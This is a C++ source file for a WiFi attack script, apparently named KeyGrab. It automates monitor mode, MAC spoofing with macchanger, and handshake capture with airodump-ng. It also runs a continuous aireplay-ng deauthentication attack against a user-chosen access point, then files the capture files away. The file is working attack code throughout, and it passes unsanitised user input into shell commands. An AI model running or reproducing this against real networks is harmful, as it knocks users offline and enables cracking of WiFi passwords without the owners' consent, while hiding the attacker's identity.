#include <iostream>
#include <cstdlib>
#include <string>

using namespace std;
void clean();
void randomize();
void reset_mac();
void gnome_terminal(string, string);
void organize(string);

int main() {
	string pause;
	string dir;
	string t_mac_a;
	string answer;
	string answer2;
	string answer3;
	string answer4;
	string deauth;
	cout << "Starting..." << endl;
	system ("airmon-ng start wlan0");
	randomize();
	system ("airodump-ng wlan0mon");
	system("echo \"$(tput setaf 6)$(tput bold)$(tput smul)Target MAC Address:$(tput bold)$(tput smul)$(tput sgr 0)\"");
	cin >> answer;
	if (answer == "quit" || answer == "exit") {
		return 0;
	}
	dir = "mkdir ";
	dir += answer;
	system(dir.c_str());
	system("echo \"$(tput setaf 6)$(tput bold)$(tput smul)Channel:$(tput sgr 0)\"");
	cin >> answer2;
	system("airmon-ng stop wlan0mon");
	t_mac_a = "airmon-ng start wlan0 ";
	t_mac_a += answer2;
	system(t_mac_a.c_str());
	randomize();
	//
	gnome_terminal(answer, answer2);
	//

	deauth = "aireplay-ng -0 0 -a ";
	deauth += answer;
	deauth += " wlan0mon";
	system(deauth.c_str());
	cout << endl;
	cout << endl;
	cout << endl;
	cout << endl;
	system("echo \"$(tput bold)$(tput smul)$(tput setaf 6)Cleaning:$(tput sgr 0)\"");
	system("cd ..");
	//
	organize(answer);
	//
	reset_mac();
	clean();
}

void clean() {
	
	system("airmon-ng stop wlan0mon");
	system("sudo service network-manager restart");
	system("ifconfig wlan0 up");
}

void randomize() {
	system("ifconfig wlan0mon down");
	system("macchanger -a wlan0mon");
	system("ifconfig wlan0mon up");
}

void reset_mac() {
	system("ifconfig wlan0mon down");
	system("macchanger -p wlan0mon");
	system("ifconfig wlan0mon up");
}

void gnome_terminal(string mac, string ch) {
	string t_mac_a;
	t_mac_a = "gnome-terminal -x sh -c "; 
	t_mac_a += "\""; 
	t_mac_a += "airodump-ng -c";
	t_mac_a += ch;
	t_mac_a += " -w Key --bssid ";
	t_mac_a += mac;
	t_mac_a += " wlan0mon; bash \"";
	system(t_mac_a.c_str());
}

void organize(string mac) {
	string dir;
	dir = "mv Key-01.cap /root/Scripts/KeyGrab/";
	dir += mac;
	dir += "/";
	system(dir.c_str());
	dir = "mv Key-01.csv /root/Scripts/KeyGrab/";
	dir += mac;
	dir += "/";
	system(dir.c_str());
	dir = "mv Key-01.kismet.csv /root/Scripts/KeyGrab/";
	dir += mac;
	dir += "/";
	system(dir.c_str());
	dir = "mv Key-01.kismet.netxml /root/Scripts/KeyGrab/";
	dir += mac;
	dir += "/";
	system(dir.c_str());
}
